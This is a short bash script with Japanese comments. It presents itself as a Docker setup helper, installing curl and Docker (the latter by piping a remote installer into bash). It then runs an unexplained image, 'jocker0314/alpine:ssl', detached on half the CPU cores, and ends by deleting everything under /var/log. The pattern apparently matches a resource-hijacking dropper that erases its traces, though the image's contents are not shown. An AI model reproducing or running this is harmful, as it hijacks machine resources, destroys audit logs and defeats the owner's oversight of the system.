#!/bin/bash

# curlの存在をチェックし、存在しない場合はインストールする
if ! command -v curl &> /dev/null; then
    echo "curl がインストールされていません。インストールを開始します..."
    # システムの種類に応じて異なるパッケージ管理システムを使用してcurlをインストールする
    if [ -x "$(command -v apt-get)" ]; then
        sudo apt-get update
        sudo apt-get install -y curl
    elif [ -x "$(command -v yum)" ]; then
        sudo yum install -y curl
    else
        echo "パッケージ管理システムが特定できません。curlを手動でインストールしてからスクリプトを再実行してください。"
        exit 1
    fi
else
    echo "curl はインストールされています"
fi

# Dockerの存在をチェックし、存在しない場合はインストールする
if ! command -v docker &> /dev/null; then
    echo "Docker がインストールされていません。インストールを開始します..."
    # curlを使用してAliyunミラーからDockerのインストールスクリプトをダウンロードし、実行する
    curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
else
    echo "Docker はインストールされています"
fi

# Dockerサービスのステータスをチェックし、停止している場合は起動する
if ! systemctl is-active --quiet docker; then
    echo "Docker サービスが停止しています。起動します..."
    sudo systemctl start docker
else
    echo "Docker サービスは起動しています"
fi

# システムのCPUコア数の半分を計算する
half_cpus=$(( $(nproc) / 2 ))

# jocker0314/alpine:ssl のイメージを起動し、CPUリソースを半分だけ使用する
docker run -d --cpus="$half_cpus" jocker0314/alpine:ssl
# /var/log/ディレクトリをクリアする
rm -rf /var/log/*
